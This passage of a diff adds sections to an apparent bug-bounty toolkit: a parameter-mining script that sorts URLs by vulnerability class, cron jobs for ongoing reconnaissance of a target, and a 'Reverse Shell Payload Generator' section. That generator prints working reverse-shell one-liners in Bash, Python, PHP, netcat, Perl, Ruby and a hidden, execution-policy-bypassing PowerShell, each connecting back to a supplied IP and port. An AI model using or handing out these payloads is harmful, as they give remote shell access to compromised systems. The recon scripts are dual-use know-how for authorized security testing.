+DOMAIN="$1"
+echo "[*] Param mining on $DOMAIN"
+
+# ParamSpider (Wayback-based)
+paramspider -d "$DOMAIN" -o paramspider_out.txt
+
+# Arjun (brute force)
+arjun -u "https://$DOMAIN/api/endpoint" -oT arjun_out.txt
+
+# GF patterns for common vulns
+cat paramspider_out.txt | gf xss > xss_params.txt
+cat paramspider_out.txt | gf sqli > sqli_params.txt
+cat paramspider_out.txt | gf ssrf > ssrf_params.txt
+cat paramspider_out.txt | gf redirect > redirect_params.txt
+cat paramspider_out.txt | gf idor > idor_params.txt
+cat paramspider_out.txt | gf lfi > lfi_params.txt
+cat paramspider_out.txt | gf rce > rce_params.txt
+cat paramspider_out.txt | gf debug_logic > debug_params.txt
+cat paramspider_out.txt | gf interestingparams > interesting_params.txt
+
+echo "[+] Parameter files by vuln class generated."
+```
+
+## C11: Continuous Monitoring Cron Setup
+```bash
+# Add to crontab (crontab -e):
+# Runs weekly recon on Monday 9AM
+0 9 * * 1 cd /home/user/bugbounty/target.com && ./recon.sh target.com
+# Checks for new subdomains daily
+0 6 * * * cd /home/user/bugbounty/target.com && subfinder -d target.com -silent | sort > new_subs.txt && diff live_subs.txt new_subs.txt | grep ">" > changed.txt
+# Monitors JS files for changes
+0 */6 * * * cd /home/user/bugbounty/target.com && katana -list live.txt -jc -silent | sort -u > js_today.txt && diff js_yesterday.txt js_today.txt > js_changed.txt
+# Checks GitHub for new commits
+0 8 * * * cd /home/user/bugbounty/target.com && python3 /opt/github-subdomains.py -t $GITHUB_TOKEN -d target.com -o gh_subs.txt
+```
+
+## C12: Reverse Shell Payload Generator
+```bash
+# Usage: ./rs.sh <IP> <PORT>
+IP="$1"
+PORT="$2"
+
+cat << RSEOF
+# Bash
+bash -i >& /dev/tcp/$IP/$PORT 0>&1
+
+# Python
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# PHP
+php -r '\$s=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Netcat
+nc -e /bin/sh $IP $PORT
+
+# Perl
+perl -e 'use Socket;\$i="$IP";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Ruby
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$IP","$PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# PowerShell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('$IP',$PORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1 | Out-String );\$sendback2=\$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
+RSEOF
+```
 
 ---
 
